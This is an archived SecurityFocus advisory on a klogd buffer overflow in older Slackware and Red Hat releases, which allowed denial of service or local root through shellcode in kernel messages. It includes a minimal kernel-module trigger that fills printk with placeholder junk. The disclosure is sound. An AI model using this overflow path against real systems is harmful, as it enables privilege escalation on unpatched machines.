source: http://www.securityfocus.com/bid/398/info


It is possible to cause a denial of service (remote and local) through generating old, obscure kernel messages (not terminated with \n) in klogd. The problem exists because of a buffer overflow in the klogd handling of kernel messages. It is possible to gain local root access through stuffing shellcode into printk() messages which contain user-controllable variables (eg, filenames). What makes this problem strange, however, is that it was fixed two years ago. Two of the most mainstream linux distributions (Slackware Linux and RedHat Linux), up until recently, are known to have been shipping with the very old vulnerable version. Fixes and updates were released promptly. There is no data on other distributions.

The following "exploit" is a small module you can use to try and exploit the problem on your machine.

-- gcc -c -O3 test.c; insmod test; rmmod test --

#define MODULE
#define __KERNEL__
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/malloc.h>
#include <asm/unistd.h>
#include <linux/version.h>
#include <asm/string.h>

int init_module(void) {
printk("INSERT_ABOUT_2000_BYTES_OF_JUNK_HERE\n");
return 0;
}

Klogd Exploit Using Envcheck by Esa Etelavuori <eetelavu@cc.hut.fi>
Release Date: 20000925 